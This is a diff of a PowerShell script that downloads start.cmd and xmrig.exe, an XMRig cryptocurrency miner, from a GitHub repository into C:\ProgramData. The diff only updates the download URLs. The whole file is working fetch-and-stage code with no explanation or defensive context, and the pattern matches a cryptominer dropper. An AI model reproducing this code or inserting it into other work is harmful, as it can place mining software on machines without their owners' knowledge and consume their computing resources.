@@ -1,7 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/installer/start.cmd"
+$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/start.cmd"
 Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\start.cmd"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/installer/xmrig.exe"
+$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
 Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\xmrig.exe"
